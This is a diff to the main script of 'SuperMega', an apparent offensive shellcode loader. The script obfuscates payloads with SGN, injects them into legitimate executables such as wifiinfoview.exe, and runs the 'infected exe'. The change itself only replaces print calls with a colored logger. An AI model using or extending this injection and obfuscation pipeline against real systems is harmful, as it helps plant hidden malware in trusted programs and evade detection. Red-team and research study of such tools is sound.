@@ -4,16 +4,15 @@ from helper import *
 import argparse
 from typing import Dict
 import pickle
+import logging
 
 from model import *
 from config import config
 from pehelper import *
-
 import phases.templater
 import phases.compiler
 import phases.assembler
 import phases.injector
-
 from observer import observer
 from project import project
 
@@ -23,8 +22,47 @@ main_exe_file = os.path.join(build_dir, "main.exe")
 main_shc_file = os.path.join(build_dir, "main.bin")
 
 
+
+# ANSI escape sequences for colors
+class LogColors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+# Custom formatter to include colors in log output
+class CustomFormatter(logging.Formatter):
+    #format = "%(asctime)s - %(name)-12s - [%(levelname)-8s] - %(message)s (%(filename)s:%(lineno)d)"
+    format = "(%(filename)-12s) %(message)s"
+
+    FORMATS = {
+        logging.DEBUG: format,
+        logging.INFO: format,
+        logging.WARNING: LogColors.WARNING + format + LogColors.ENDC,
+        logging.ERROR: LogColors.FAIL + format + LogColors.ENDC,
+        logging.CRITICAL: LogColors.FAIL + LogColors.BOLD + format + LogColors.ENDC
+    }
+
+    def format(self, record):
+        log_fmt = self.FORMATS.get(record.levelno)
+        formatter = logging.Formatter(log_fmt, datefmt="%Y-%m-%d %H:%M:%S")
+        return formatter.format(record)
+
+
+# Configure logging
+handler = logging.StreamHandler()
+handler.setFormatter(CustomFormatter())
+logging.basicConfig(level=logging.DEBUG, handlers=[handler])
+logger = logging.getLogger("ExploitLogger")
+
+
 def main():
-    print("Super Mega")
+    logger.info("Super Mega")
     config.load()
 
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
@@ -65,19 +103,19 @@ def main():
             project.inject_exe_out = "out/wifiinfoview.exe-a.exe"
 
         else:
-            print("Unknown verify option {}, use std/iat".format(args.verify))
+            logger.info("Unknown verify option {}, use std/iat".format(args.verify))
 
     else:
         project.try_start_final_infected_exe = True
 
         if args.shellcode:
             if not os.path.isfile(args.shellcode):
-                print("Could not find: {}".format(args.shellcode))
+                logger.info("Could not find: {}".format(args.shellcode))
                 return
             project.payload = args.shellcode
         if args.inject:
             if not os.path.isfile(args.inject):
-                print("Could not find: {}".format(args.inject))
+                logger.info("Could not find: {}".format(args.inject))
                 return
             project.inject = True
             project.inject_exe_in = args.inject
@@ -109,7 +147,7 @@ def start():
     #observer.add_json("capabilities_a", project.exe_capabilities)
     #observer.add_json("options", options)
 
-    print("--[ SourceStyle: {}".format(project.source_style.name))
+    logger.info("--[ SourceStyle: {}".format(project.source_style.name))
 
     # Copy: loader C files into working directory: build/
     phases.templater.create_c_from_template()
@@ -141,13 +179,13 @@ def start():
         phases.assembler.merge_loader_payload(main_shc_file)
 
         if project.verify and project.source_style == SourceStyle.peb_walk:
-            print("--[ Verify final shellcode ]")
+            logger.info("--[ Verify final shellcode ]")
             if not verify_shellcode(main_shc_file):
-                print("Could not verify, still continuing")
+                logger.info("Could not verify, still continuing")
                 #return
 
         if project.try_start_final_shellcode:
-            print("--[ Test Append shellcode ]")
+            logger.info("--[ Test Append shellcode ]")
             try_start_shellcode(main_shc_file)
 
         # copy it to out
@@ -158,7 +196,7 @@ def start():
     #  after we packed everything (so jmp to end of code still works)
     #if options["obfuscate_shc_loader"] and project.exe_capabilities.rwx_section != None:
     if project.exe_capabilities.rwx_section != None:
-        print("--[ Use SGN]")
+        logger.info("--[ Use SGN]")
         obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")
 
         observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
@@ -174,13 +212,13 @@ def start():
 
         phases.injector.inject_exe(main_shc_file)
         if project.verify:
-            print("--[ Verify final exe ]")
+            logger.info("--[ Verify final exe ]")
             if phases.injector.verify_injected_exe(project.inject_exe_out):
                 #debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
                 pass
 
         if project.try_start_final_infected_exe:
-            print("--[ Start infected exe ]")
+            logger.info("--[ Start infected exe ]")
             run_process_checkret([
                 project.inject_exe_out,
             ], check=False)
@@ -196,7 +234,7 @@ def start():
 
 
 def obfuscate_shc_loader(file_shc_in, file_shc_out):
-    print("--[ Convert with SGN ]")
+    logger.info("--[ Convert with SGN ]")
     if True:
         path_sgn = r'C:\tools\sgn2.0\sgn.exe'
         run_process_checkret([
@@ -214,19 +252,19 @@ def obfuscate_shc_loader(file_shc_in, file_shc_out):
             "-o", "{}".format(file_shc_out),
         ], check=True)
     if not os.path.isfile(file_shc_out):
-        print("Error")
+        logger.info("Error")
         return
     else:
-        print("   > Success obfuscation")
+        logger.info("   > Success obfuscation")
         pass
 
 
 def verify_shellcode(shc_name):
-    print("---[ Verify shellcode: {} ]".format(shc_name))
+    logger.info("---[ Verify shellcode: {} ]".format(shc_name))
 
     # check if directory exists
     if not os.path.exists(os.path.dirname(verify_filename)):
-        print("Error, directory does not exist for: {}".format(verify_filename))
+        logger.info("Error, directory does not exist for: {}".format(verify_filename))
         return
     
     # remove indicator file
@@ -238,14 +276,13 @@ def verify_shellcode(shc_name):
     ], check=False)
     time.sleep(SHC_VERIFY_SLEEP)
     if os.path.isfile(verify_filename):
-        print("---> Verify OK. Shellcode works (file was created)")
+        logger.info("---> Verify OK. Shellcode works (file was created)")
         os.remove(verify_filename)
         return True
     else:
-        print("---> Verify FAIL. Shellcode doesnt work (file was not created)")
+        logger.info("---> Verify FAIL. Shellcode doesnt work (file was not created)")
         return False
     
 
 if __name__ == "__main__":
     main()
-
